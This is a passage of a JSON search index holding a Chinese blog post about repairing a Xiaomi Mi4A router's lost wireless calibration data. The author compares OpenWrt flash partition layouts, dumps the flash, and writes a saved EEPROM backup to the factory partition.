<p>\u6ce8\u610f\uff1a\u70b9\u51fbEEPROM\u540e\uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u4e0b\u8f7deeprom\u5907\u4efd\uff0c\u9ed8\u8ba4\u6587\u4ef6\u540deeprom.bin\uff0c\u6587\u4ef6\u5927\u5c0f\u4e00\u822c64K\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u4e00\u822c\u5305\u542b\u8def\u7531\u5668MAC\u5730\u5740\u3001\u65e0\u7ebf\u6821\u51c6\u53c2\u6570\u7b49\u3002\u4e22\u5931\u8be5\u6587\u4ef6\uff0c\u65e0\u7ebf\u8def\u7531\u5668\u53ef\u80fdWAN\u56e0\u4e3a\u6ca1\u6709MAC\u65e0\u6cd5\u4ece\u4e0a\u7ea7\u8def\u7531\u5668\u83b7\u53d6IP\uff1b\u65e0\u7ebf\u8def\u7531\u5668\u6ca1\u6709\u65e0\u7ebf\u4fe1\u53f7\u6216\u4fe1\u53f7\u6781\u5f31\u3002\u7f16\u7a0b\u5668\u56fa\u4ef6\u5c31\u662f\u95ea\u5b58\u5168\u90e8\u5907\u4efd\uff0c\u76f8\u5f53\u4e8e\u7535\u8111\u786c\u76d8\u7684\u5168\u76d8\u955c\u50cf\u3002\u65e0\u7ebf\u8def\u7531\u5668\u5237\u673a\u4e2d\uff0cBreed\u8be6\u7ec6\u4f7f\u7528\u6559\u7a0b\uff0c\u4e00\u4e9b\u6ce8\u610f\u4e8b\u9879_\u5907\u4efd (sohu.com)</p> <p>\u5e78\u597d\u6211\u7b2c\u4e00\u6b21\u5237breed\u65f6\uff0c\u5728breed\u4e2d\u9009\u62e9\u4fdd\u5b58\u4e86EEPROM\u4ee5\u53ca\u7f16\u7a0b\u5668\u56fa\u4ef6\u3002\u4e8e\u662f\u6211\u8fdb\u884c\u4e86\u4ee5\u4e0b\u64cd\u4f5c\uff1a</p> <ol> <li>\u4f7f\u7528breed\u6062\u590dEEPROM\u540e\uff0c\u540c\u65f6\u5237\u5165openwrt\u5b98\u65b921.02\u7248\u672cinitramfs-kernel.bin\uff0c\u7ed3\u679c\u6ca1\u6709\u65e0\u7ebf\u7f51\u7edc\u3002</li> <li>\u5728openwrt\u4e2d\u66f4\u65b0\u4e3a\u5b98\u65b921.02\u7248\u672csysupgrade.bin\u540e\uff0c\u53d8\u7816</li> <li>\u4f7f\u7528breed\u6062\u590d\u5b98\u65b9bootloader\uff0c\u6062\u590d\u5b98\u65b9\u56fa\u4ef6\uff0c\u4ecd\u7136\u6709\u4e0a\u9762\u95ee\u9898</li> <li>\u518d\u6b21\u5237breed\uff0c\u6062\u590d\u7f16\u7a0b\u5668\u56fa\u4ef6full.bin</li> <li>\u5237openwrt sysupgrade.bin\uff0c\u53cd\u590d\u91cd\u542f\uff08\u9ec4\u706f\u4e0d\u4eae\uff09</li> <li>\u5237\u81ea\u5df1\u7f16\u8bd1\u7684squashfs-sysupgrade.bin\uff0c\u53cd\u590d\u91cd\u542f</li> <li>\u53d1\u73b0MAC\u5730\u5740\u53d1\u751f\u4e86\u6539\u53d8\uff0c\u6062\u590dfull.bin</li> <li>\u518d\u6b21\u5237\u81ea\u5df1\u7f16\u8bd1\u7684squashfs-sysupgrade.bin\uff0c\u540c\u65f6\u52fe\u9009EEPROM\uff0c\u53cd\u590d\u91cd\u542f</li> <li> <p>\u5237\u4e86\u7f51\u4e0a\u6559\u7a0b\u63d0\u4f9b\u7684\u6807\u660e\u4e3amir3g\u7684\u56fa\u4ef6\uff08\u8fd9\u91cc\u53ef\u80fd\u5bfc\u81f4\u540e\u9762\u7684factory\u5206\u533a\u524d\u79fb\u7684\u95ee\u9898\uff09\uff0c\u53ef\u4ee5\u542f\u52a8\uff0c\u4f46\u662f\u8c8c\u4f3c\u6ca1\u6709\u7f51\u901f\u3002\u5206\u533a\u5982\u4e0b\uff1a\uff08\u8bb0\u4f4f\u8fd9\u91cc\u7684factory offset\u4e3a0x40000\uff09    </p> </li> <li> <p>\u6700\u540e\u8fd8\u662f\u4e0d\u901a\u8fc7breed\u5237\u56de\u4e86\u6211\u7684\u7cfb\u7edf\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff1a\u5b98\u65b9\u56fa\u4ef6OS1\u5206\u533a\u4e3a13M\uff08\u4f46\u52a0\u4e0a\u5b98\u65b9\u56fa\u4ef6\u91cc\u591a\u51fa\u7684disk\u5206\u533a\uff0c\u5927\u5c0f\u4e3a14.5M\uff09\uff0c\u800c\u6211\u81ea\u5df1\u7f16\u8bd1\u7684\u955c\u50cf\u8d85\u8fc7\u4e8613M\uff0c\u56e0\u6b64\u76f4\u63a5\u5237\u4f1a\u62a5\u9519\u3002\u4e8e\u662f\u6211\u5148\u5237\u5b98\u65b9\u955c\u50cf\uff0c\u518d\u5347\u7ea7\u4e3a\u6211\u7684\u955c\u50cf\uff0c\u6210\u529f\u3002\u7136\u800c\u8fd8\u662f\u6ca1\u6709\u89e3\u51b3\u95ee\u9898\u3002</p> </li> </ol>","tags":["openwrt","breed","flash\u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u7b2c\u4e8c\u6b21\u5c1d\u8bd5","title":"\u7b2c\u4e8c\u6b21\u5c1d\u8bd5","text":"<p>\u6211\u8fd8\u662f\u8ba4\u4e3a\u662fEEPROM\u4e22\u5931\u5bfc\u81f4\u7684\u95ee\u9898\uff0c\u60f3\u5230\u6211\u4e4b\u524d\u4fdd\u5b58\u4e86\u5b8c\u6574\u7684flash\u5185\u5bb9\uff0c\u56e0\u6b64\u6211\u8003\u8651\u76f4\u63a5\u5728openwrt\u4e2d\u5c06flash\u5185\u5bb9dump\u4e0b\u6765\uff0c\u548c\u4e4b\u524d\u4fdd\u5b58\u7684\u8fdb\u884c\u5bf9\u6bd4\u3002</p>","tags":["openwrt","breed","flash\u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u7406\u8bba","title":"\u7406\u8bba","text":"<p>\u8fd9\u6b21\u6211\u4ed4\u7ec6\u9605\u8bfb\u4e86openwrt\u5b98\u65b9\u5173\u4e8eFlash Layout\u7684\u6587\u6863\uff08[OpenWrt Wiki] The OpenWrt Flash Layout\uff09\uff0c\u5176\u4e2d\u7684\u5185\u5bb9\u975e\u5e38\u4e30\u5bcc\uff0c\u4ecb\u7ecd\u4e86\uff1a</p> <ul> <li>flash\u53ef\u80fd\u4f1a\u56e0\u4e3aelectromigration,  whisker growth\u800c\"\u78e8\u635f\"\u3002</li> <li>raw flash\u548cFTL (Flash Translation Layer) flash\u7684\u533a\u522b</li> <li>\u4e00\u4e2a\u76f4\u63a5\u63a5\u5165SoC\uff08spi \u63a7\u5236\u5668\u4e5f\u7b97\uff1f\uff09\uff0c\u9700\u8981\u901a\u8fc7\u8f6f\u4ef6\u6765\u5904\u7406\u574f\u5757\u548c\u78e8\u635f\u5747\u8861</li> <li>\u800c\u53e6\u4e00\u4e2a\u5219\u5728flash\u4e0a\u5305\u542b\u4e00\u4e2a\u786c\u4ef6\u6a21\u5757\uff0c\u6765\u5904\u7406\u574f\u5757\u548c\u78e8\u635f\u5747\u8861</li> <li>\u5d4c\u5165\u5f0f\u4e2d\u57fa\u672c\u90fd\u662fraw flash</li> <li>NOR \u548c NAND\u7684\u533a\u522b</li> <li>NOR flash\u4e00\u822c\u6bd4\u8f83\u5c0f\uff08\u59824MB-16MB\uff09\uff0c\u53ef\u4ee5\u4fdd\u8bc1\u662ferror-free\u7684</li> <li>NAND flash\u901a\u5e38\u66f4\u5927\u4e9b\uff0832MB-256MB\uff09\uff0c\u4e0d\u662ferror-free\u7684\uff0c\u9700\u8981\u5904\u7406\u574f\u5757     &gt; 1. the manufacturer of the \u201craw NAND flash\u201d has to guarantee that certain erase blocks are error-free:     &gt;    - namely the one(s) which the bootloader is to be written to     &gt;    - but also the ones which the Linux kernel and the SquashFS are to be written to, because the firmware image file is generated on some desktop computer, that cannot know which erase blocks of the \u201craw NAND flash\u201d of the device are bad.     &gt; 2. the Image Generator has be constrained to build only file sizes that are equal or smaller than the size of the area of the \u201craw NAND flash\u201d, that consists of guaranteed error-free erase blocks.     &gt; 3. OpenWrt would replace JFFS2 with UBIFS, and the entire area of the \u201craw NAND flash\u201d, that consists of potentially bad erase blocks, would be written to exclusively from an installed OpenWrt system through UBIFS.</li> <li>flash\u7684\u5206\u533a <p>The available storage is not partitioned in the traditional way, where you store the data about the partitions in the MBR and PBRs, but it is done in the Linux Kernel (and sometimes independently in the bootloader as well!). It's simply defined, that \u201cpartition <code>kernel</code> starts at offset <code>x</code> and ends at offset <code>y</code>\u201d. Using names allows convenient addressing of partitions by name instead of giving the start offset over and over again.</p> </li> <li>\u4ec0\u4e48\u662fMTD\uff1aMemory Technology Device - Wikipedia</li> <li>openwrt\u6587\u4ef6\u7cfb\u7edf\u4f8b\u5b50   </li> </ul>","tags":["openwrt","breed","flash\u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#explanations","title":"Explanations","text":"<p>The Linux kernel treats \u201craw flash memory\u201d (no matter whether NOR or NAND) chips as an MTD (Memory Technology Device) and employs filesystems developed for this purpose on top of the MTD layer.</p> <p>Since the partitions are nested we look at this whole thing in layers:</p> <ol> <li>Layer0: So we have the Flashchip, 8\u202fMiB in size, which is soldered to the PCB and connected to the soc over SPI (Serial Peripheral Interface Bus).</li> <li>Layer1: We \u201cpartition\u201d the space into mtd0 for the bootloader, mtd5 for OpenWrt and, in this case, mtd4 for the ART (Atheros Radio Test) - it contains calibration data for the wifi (EEPROM). If it is missing or corrupt, <code>ath9k</code> (wireless driver) won't come up anymore. The bootloader (128\u202fKiB) contains of the u-boot 64KiB block AND a data section which contains the MAC, WPS-PIN and type description. If no MAC is configured ath9k will not work correctly due to a faulty MAC.</li> <li>Layer2: we subdivide mtd5 (firmware) into mtd1 (kernel) and mtd2 (rootfs); In the generation process of the firmware (see imagebuilder) the Kernel binary file is first packed with LZMA, then the obtained file is packed with gzip and then this file will be written onto the raw flash (mtd1) without being part of any filesystem! During boot, u-boot copies this entire section into RAM and executes it. From there on, the Linux kernel bootstraps itself\u2026</li> <li>Layer3: we subdivide rootfs even further into mtd3 for rootfs_data and the rest for an unnamed partition which will accommodate the SquashFS-partition.</li> </ol>","tags":["openwrt","breed","flash\u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#mount-points","title":"Mount Points","text":"<ul> <li><code>/</code> this is your entire root filesystem, it comprises <code>/rom</code> and <code>/overlay</code>. Please ignore <code>/rom</code> and <code>/overlay</code> and use exclusively <code>/</code> for your daily routines!</li> <li><code>/rom</code> contains all the basic files, like <code>busybox</code>, <code>dropbear</code> or <code>iptables</code>. It also includes default configuration files used when booting into OpenWrt Failsafe mode. It does not contain the Linux kernel. All files in this directory are located on the SqashFS partition, and thus cannot be altered or deleted. But, because we use overlay_fs filesystem, overlay-whiteout-symlinks can be created on the JFFS2 partition.</li> <li><code>/overlay</code> is the writable part of the file system that gets merged with <code>/rom</code> to create a uniform <code>/</code>-tree. It contains anything that was written to the router after installation, e.g. changed configuration files, additional packages installed with <code>opkg</code>, etc. It is formated with JFFS2.</li> </ul> <p>Whenever the system is asked to look for an existing file in <code>/</code>, it first looks in <code>/overlay</code>, and if not there, then in <code>/rom</code>. In this way <code>/overlay</code> overrides <code>/rom</code> and creates the effect of a writable <code>/</code> while much of the content is safely and efficiently stored in the read-only <code>/rom</code>.</p>","tags":["openwrt","breed","flash\u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u5b9e\u8df5","title":"\u5b9e\u8df5","text":"<p>Windows\u4e0b\u6211\u4f7f\u7528\u4e86Free Hex Editor: Fastest Binary File Editing Software. Freeware. Windows (hhdsoftware.com)\u6765\u67e5\u770b\u4e8c\u8fdb\u5236\u6587\u4ef6\u4fe1\u606f</p> <ol> <li>\u9996\u5148\u67e5\u770bflash\u5206\u533a\u4fe1\u606f    \u53ef\u4ee5\u901a\u8fc7<code>cat /proc/mtd</code>\u6765\u67e5\u770bmtd\u5206\u533a\uff0c\u4e0d\u8fc7\u5176\u4e2d\u6709\u4e9b\u5206\u533a\u662f\u91cd\u53e0\u7684\u3002\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7<code>dmsg</code>\u6765\u67e5\u770b\u7cfb\u7edf\u7684\u542f\u52a8\u4fe1\u606f\uff0c\u627e\u5230\u5176\u4e2d\u7684mtd\u4fe1\u606f\uff0c\u5982\u4e0b\uff1a</li> </ol> <p><pre><code>[    0.615097] Creating 8 MTD partitions on \"spi0.0\":\n[    0.619893] 0x000000000000-0x000000030000 : \"u-boot\"\n[    0.626143] 0x000000030000-0x000000040000 : \"u-boot-env\"\n[    0.632722] 0x000000040000-0x000000050000 : \"Bdata\"\n[    0.638791] 0x000000050000-0x000000060000 : \"factory\"\n[    0.645206] 0x000000060000-0x000000070000 : \"crash\"\n[    0.651386] 0x000000070000-0x000000080000 : \"cfg_bak\"\n[    0.657804] 0x000000080000-0x000000180000 : \"overlay\"\n[    0.664113] 0x000000180000-0x000001000000 : \"firmware\"\n[    0.670710] 2 uimage-fw partitions found on MTD device firmware\n[    0.676656] Creating 2 MTD partitions on \"firmware\":\n[    0.681625] 0x000000000000-0x00000024d580 : \"kernel\"\n[    0.687745] 0x00000024d580-0x000000e80000 : \"rootfs\"\n[    0.693746] mtd: device 9 (rootfs) set to be root filesystem\n[    0.699502] 1 squashfs-split partitions found on MTD device rootfs\n[    0.705684] 0x000000d30000-0x000000e80000 : \"rootfs_data\"\n[    0.713298] libphy: Fixed MDIO Bus: probed\n[    0.743012] libphy: mdio: probed\n[    0.746455] mt7530 mdio-bus:1f: MT7530 adapts as multi-chip module\n[    0.755279] mtk_soc_eth 1e100000.ethernet: generated random MAC address aa:f9:37:65:6e:50\n[    0.764330] mtk_soc_eth 1e100000.ethernet eth0: mediatek frame engine at 0xbe100000, irq 21\n[    0.774735] mt7621-pci 1e140000.pcie: Parsing DT failed\n</code></pre>    \u53ef\u548c\u5b98\u65b9\u56fa\u4ef6\u4f5c\u5bf9\u6bd4\uff08\u542f\u52a8\u4fe1\u606f\u4eceopenwrt\u5bf9\u5e94\u8bbe\u5907\u9875\u9762\u83b7\u5f97\uff09\uff1a    <pre><code>[    2.280000] flash manufacture id: c8, device id 40 18\n[    2.280000] GD25Q128C(c8 40180000) (16384 Kbytes)\n[    2.280000] mtd .name = raspi, .size = 0x01000000 (16M) .erasesize = 0x00010000 (64K) .numeraseregions = 0\n[    2.280000] Creating 10 MTD partitions on \"raspi\":\n[    2.280000] 0x000000000000-0x000001000000 : \"ALL\"\n[    2.280000] 0x000000000000-0x000000030000 : \"Bootloader\"\n[    2.280000] 0x000000030000-0x000000040000 : \"Config\"\n[    2.280000] 0x000000040000-0x000000050000 : \"Bdata\"\n[    2.280000] 0x000000050000-0x000000060000 : \"Factory\"\n[    2.290000] 0x000000060000-0x000000070000 : \"crash\"\n[    2.290000] 0x000000070000-0x000000080000 : \"cfg_bak\"\n[    2.290000] 0x000000080000-0x000000180000 : \"overlay\"\n[    2.290000] 0x000000180000-0x000000e80000 : \"OS1\"\n[    2.290000] mtd: try split OS1 partition\n[    2.290000] mtd: split_firmware\n[    2.290000] mtd: firmware_partition-&gt;size   0xd00000\n[    2.290000] mtd: firmware_partition-&gt;offset 0x180000\n[    2.290000] mtd: uimage_len 1855601\n[    2.290000] mtd: uimage_len 1900544\n[    2.290000] mtd: rootfs_partition-&gt;size   0xb30000\n[    2.290000] mtd: rootfs_partition-&gt;offset 0x350000\n[    2.290000] mtd: partition \"rootfs\" created automatically, ofs=350000, len=B30000\n[    2.290000] 0x000000350000-0x000000e80000 : \"rootfs\"\n[    2.290000] 0x000000e80000-0x000001000000 : \"disk\"\n</code></pre> 2. \u7136\u540edump\u5b8c\u6574\u7684flash\uff08\u4e4b\u524d\u901a\u8fc7breed\u4fdd\u5b58\u7684EEPROM\u4e3aeeprom.bin\uff0c\u5b8c\u6574flash\u4e3afull.bin\uff09    <pre><code>cat /dev/mtd0 &gt; dump.bin\ncat /dev/mtd1 &gt;&gt; dump.bin\ncat /dev/mtd2 &gt;&gt; dump.bin\ncat /dev/mtd3 &gt;&gt; dump.bin\ncat /dev/mtd4 &gt;&gt; dump.bin\ncat /dev/mtd5 &gt;&gt; dump.bin\ncat /dev/mtd6 &gt;&gt; dump.bin\ncat /dev/mtd7 &gt;&gt; dump.bin\n</code></pre> 3. \u53d1\u73b0eeprom.bin\u7684\u5927\u5c0f\u4e3a64KB\uff0c\u521a\u597d\u5bf9\u5e940x10000\u7684\u5927\u5c0f\u3002\u901a\u8fc7\u5728full.bin\u4e2d\u67e5\u627eeeprom.bin\u5185\u5bb9\uff0c\u5bb9\u6613\u5b9a\u4f4d\u5230Factory(0x50000)\u8fd9\u4e2a\u5206\u533a\u3002\u53d1\u73b0Factory\u5206\u533a\u4e2d\u5373\u5b58\u50a8\u4e86EEPROM\u5185\u5bb9\u3002    </p> <ol> <li>\u7136\u800copenwrt\u76f4\u63a5dump\u4e0b\u6765\u7684\u6587\u4ef6\u4e2d\uff0c\u76f8\u540c\u7684\u5185\u5bb9\uff0c\u4f4d\u7f6e\u5374\u5b9a\u4f4d\u5230\u4e86Bdata(0x40000)\u8fd9\u4e2a\u5206\u533a    </li> <li>\u5bf9\u6bd4\u5176\u4ed6\u5206\u533a\uff0c\u53ef\u4ee5\u53d1\u73b0\uff1a</li> <li>(0x00000-0x30000)Bootloader\u5bf9\u5e94u-boot      </li> <li>(0x30000-0x40000)Config\u5bf9\u5e94u-boot-env      </li> <li>(0x80000-0x180000)overlay\u548coverlay\u76f8\u5bf9\u5e94      </li> <li>\u4e2d\u95f4\u7684\u5185\u5bb9\u4e24\u8fb9\u90fd\u4e0d\u540c\uff0c\u6bd4\u8f83\u660e\u663e\u7684\u662fdump.bin\u4e2dBdata\u5b58\u50a8\u4e86Factory\u5185\u5bb9\uff0c\u800cFactory\u7684\u5185\u5bb9\u672a\u77e5\u3002</li> <li>\u56e0\u6b64\u8003\u8651\u5c06eeprom.bin\u5185\u5bb9\u5728openwrt\u4e2d\u91cd\u65b0\u5199\u5165\u5230Factory\u4e2d    \u7136\u800c\u76f4\u63a5mtd write\u4f1a\u62a5\u4ee5\u4e0b\u9519\u8bef        \u641c\u7d22\u540e\u53d1\u73b0\u9700\u8981\u5b89\u88c5\u5185\u6838\u6a21\u5757<code>kmod-mtd-rw</code>\uff0c\u7531\u4e8e\u81ea\u5df1\u7f16\u8bd1\u7684\u5185\u6838hash\u503c\u548c\u5b98\u65b9\u7248\u672c\u4e0d\u4e00\u81f4\uff0c\u4e8e\u662f\u6211\u91cd\u65b0\u7f16\u8bd1\u4e86openwrt\u955c\u50cf    \u7136\u540e\u8fd0\u884c\u547d\u4ee4 I WANT A BRICK!!!    <pre><code>insmod mtd-rw i_want_a_brick=1\n</code></pre>    \u4e8e\u662f\u6211\u4eec\u4fbf\u53ef\u4ee5\u6109\u5feb\u5730\u89e3\u9501\u5206\u533a\u4e86\uff0c\u5199\u5165eeprom\u5373\u53ef <pre><code>mtd -r write eeprom.bin factory\n</code></pre></li> <li>\u7ed3\u675f\uff0c\u5199\u5b8c\u540e\uff0c\u6211\u76845GHz \u65e0\u7ebf\u7ec8\u4e8e\u6062\u590d\u6b63\u5e38\u4e86\uff01</li> </ol>","tags":["openwrt","breed","flash\u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u540e\u8bb0","title":"\u540e\u8bb0","text":"<p>\u867d\u7136\u89e3\u51b3\u4e86\u95ee\u9898\uff0c\u4f46\u5176\u5b9e\u8fd8\u6709\u4e00\u4e9b\u7591\u95ee\uff1a 1. \u4f7f\u7528breed\u65e0\u6cd5\u6210\u529f\u5237breed\u3002\u4f7f\u7528\u7684breed\u6709\u4e24\u4e2a\u7248\u672c\uff0c\u770b\u522b\u4eba\u7684\u6559\u7a0b\u8bf4r3g\u548cmi4a\u767e\u5146\u7248\u4f7f\u7528\u4e0b\u9762\u7684\u7248\u672c\uff0cmi4a\u5343\u5146\u7248\u672c\u4f7f\u7528\u4e0a\u9762\u7684\u7248\u672c\u3002        \u7136\u800c\u4f7f\u7528breed\u65f6\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u4e0a\u9762\u6807\u7684\u95ea\u5b58\u5e03\u5c400x50000\u5e76\u4e0d\u5bf9\u5e94OS1\u7684\u5730\u5740\uff0c\u6240\u4ee5\u611f\u89c9\u4e0d\u5e94\u8be5\u4f7f\u7528\u8fd9\u4e2a\u7248\u672c\u7684breed\uff01\uff08\u6240\u4ee5\u4e0a\u9762\u53d1\u751f\u7684\u95ee\u9898\u4f1a\u4e0d\u4f1a\u662f\u7528\u9519\u7248\u672cbreed\u5bfc\u81f4\u7684\uff1f\uff09breed\u4e0a\u4e5f\u6ca1\u6709\u8bf4\u660e\u662f\u5426\u652f\u6301mi4aIndex of / (hackpascal.net)  2. \u5370\u8c61\u4e2d\u539f\u672c\u53f0\u5f0f\u63d2\u4e0a\u8def\u7531\u5668\u6d4b\u7f51\u901f\u662f\u80fd\u8dd1\u4e0a1000M\u7684\uff0c\u4f46\u662f\u73b0\u5728\u53f0\u5f0f\u76f4\u63d2\u5bdd\u5ba4\u7f51\u53e3\u4e0b\u8f7d\u901f\u7387\u53ef\u4ee5\u8dd1\u5230960M\uff0c\u800c\u63d2\u4e0a\u8def\u7531\u5668\u5374\u53ea\u6709600M\u5de6\u53f3\uff0c\u611f\u89c9\u635f\u5931\u633a\u5927\u7684\u3002\u4e0d\u77e5\u662f\u4e0d\u662f\u8def\u7531\u5668\u8fd8\u6709\u6f5c\u5728\u95ee\u9898\u3002\uff08\u96be\u9053\u662fblock\u8bbe\u7f6e\u4e3a512KB\u62d6\u6162\u4e86\u901f\u5ea6\uff1f\uff09 3. \u53ef\u4ee5\u770b\u5230\u8def\u7531\u5206\u533a\u4e2d\u9664\u4e86u-boot, u-boot-env, Factory, firmware\uff0c\u5176\u4ed6\u90e8\u5206\u611f\u89c9\u90fd\u662f\u6ca1\u7528\u7684\uff0c\u8fd9\u90e8\u5206\u662f\u5426\u80fd\u5229\u7528\u8d77\u6765\uff1f\u6bd4\u5982\u90a3\u4e2a\u7d27\u6328firmware\u7684overlay\u5206\u533a\u611f\u89c9\u662f\u6ca1\u8d77\u4f5c\u7528\u7684\uff0c\u4f46\u662f\u5360\u4e861M\u7684\u5927\u5c0f\u3002crash\u548ccfg_back\u4e5f\u53ef\u4ee5\u83b7\u5f97128KB\u7684\u7a7a\u95f4\u3002</p>","tags":["openwrt","breed","flash\u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u540e\u8bb02","title":"\u540e\u8bb02","text":"<p>\u4e4b\u524d\u6298\u817evlan\u65f6\uff0c\u4e00\u4e0d\u6ce8\u610f\u5c31\u5bfc\u81f4\u65e0\u6cd5\u8bbf\u95ee\u5230\u8bbe\u5907\u4e86\u3002\u9700\u8981\u53cd\u590d\u5237op\uff0c\u56e0\u6b64\u60f3\u4f7f\u7528breed\u6765\u7b80\u5316\u5237op\u8fc7\u7a0b\u3002\u4f46\u5176\u5b9ebreed\u5b98\u65b9\u6839\u672c\u6ca1\u6709\u5bf9mi4a\u5343\u5146\u7248\u505a\u652f\u6301\uff0c\u53ea\u662f\u56e0\u4e3a\u5176flash\u5206\u533a\u548cWR1200JS\u4e00\u6837\uff0c\u6240\u4ee5\u7f51\u4e0a\u90fd\u4f7f\u7528\u90a3\u4e2a\u7248\u672c\u7684breed\uff0c\u5f53\u65f6\u6211\u89c9\u5f97mi4a\u7684\u786c\u4ef6\u548cr3g\u4e00\u6478\u4e00\u6837\uff0c\u56e0\u6b64\u89c9\u5f97\u5237r3g\u7684\u5e94\u8be5\u4e5f\u53ef\u4ee5\u3002\u7ed3\u679c\u5237\u5b8c\u540e\u5c31\u53d8\u7816\u4e86\uff0c\u5b98\u65b9\u6062\u590d\u5de5\u5177\u4e5f\u65e0\u6cd5\u6062\u590d\u3002\u540e\u9762\u624d\u610f\u8bc6\u5230\u4e0a\u9762\u7684\u95ee\u9898\uff0cbreed\u7684flash\u5206\u533a\u548copenwrt\u7684\u4e0d\u4e00\u6837\u3002</p> <p>\u8fc7\u4e86\u534a\u5b66\u671f\uff0c\u6211\u4e70\u4e86ch341a\u7f16\u7a0b\u5668\uff0c\u53ef\u4ee5\u76f4\u63a5\u5237flash\uff0c\u56e0\u6b64\u53ef\u4ee5\u628ami4a\u6551\u56de\u6765\u4e86\u3002\u4f46\u662f\u53d1\u73b0\u4e4b\u524d\u5907\u4efd\u7684eeprom\u88ab\u6211\u5220\u4e86\uff0c\u7136\u540e\u4f7f\u7528\u7f16\u7a0b\u5668\u7684\u65f6\u5019\uff0c\u5728\u610f\u8bc6\u5230\u9700\u8981\u5148\u5907\u4efd\u65f6\u5df2\u7ecf\u70b9\u4e86\u64e6\u9664\u3002\u6240\u4ee5\u65e0\u5948\u53ea\u80fd\u5728\u7f51\u4e0a\u627e\u4e86\u522b\u4eba\u63d0\u4f9b\u7684eeprom\u3002\u60f3\u5230mi4a\u662f\u6211\u7b2c\u4e00\u4e2aopenwrt\u7684\u8bbe\u5907\uff0c\u6211\u5bf9\u5b83SLAAC\u7684ipv6\u5730\u5740\u5370\u8c61\u6df1\u523b\uff08123d\u7ed3\u5c3e\uff09\uff0c\u800c\u73b0\u5728\u6ca1\u529e\u6cd5\u6062\u590d\u4e86\uff0c\u4e0d\u514d\u6709\u70b9\u611f\u4f24\u3002</p> <p>\u5982\u679c\u8981\u7528breed\u5237openwrt\u7684\u8bdd\uff0c\u9700\u8981\u4fee\u6539op\u7684flash\u5206\u533a\uff1a - \u8fd9\u91cc\u63d0\u4f9b\u4e86\u522b\u4eba\u7f16\u8bd1\u597d\u7684\uff1a[20210919\u66f4\u65b0]\u5c0f\u7c73\u8def\u75314A\u5343\u5146\u7248LEDE\u56fa\u4ef6_\u96c6\u6210\u5feb\u4e50\u4e0a\u7f51\u3001\u5185\u7f51\u7a7f\u900f\u3001KMS\u3001\u7f51\u7edc\u52a0\u901f-\u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn) - \u8fd9\u91cc\u662f\u5982\u4f55\u81ea\u5df1\u4fee\u6539\uff1a\u5206\u4eab\u5c0f\u7c73R4A\u5343\u5146\u7248\u7f16\u8bd1OPENWRT(Breed\u76f4\u5237\u7248)-OPENWRT\u4e13\u7248-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> <p>\u4f46\u662f\u60f3\u60f3\u8fd8\u662f\u7b97\u4e86\uff0c\u4e3a\u4ec0\u4e48\u8981\u60f3\u529e\u6cd5\u53bb\u7528\u4e00\u4e2a\u5b98\u65b9\u4e0d\u652f\u6301\u7684\u4e1c\u897f\u5462\uff1f\uff08\u9020\u6210\u8fd9\u4e00\u5207\u60b2\u5267\u7684\u6e90\u5934\uff09</p>","tags":["openwrt","breed","flash\u5206\u533a","EEPROM"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/02/05/2022-02-05-%E4%BD%BF%E7%94%A8%E6%95%B4%E6%95%B0%E4%BD%8D%E8%BF%90%E7%AE%97%E8%AE%A1%E7%AE%97div10/","title":"\u4f7f\u7528\u6574\u6570\u4f4d\u8fd0\u7b97\u8ba1\u7b97div10","text":"<p>\u4f7f\u7528\u6574\u6570\u4f4d\u8fd0\u7b97\u8ba1\u7b97div10\uff0c\u5f97\u5230\u820d\u5165\u5230\u6574\u6570\u7684\u7cbe\u786e\u503c\u3002\u5f97\u5230\u4e86\u4e00\u4e2amagic 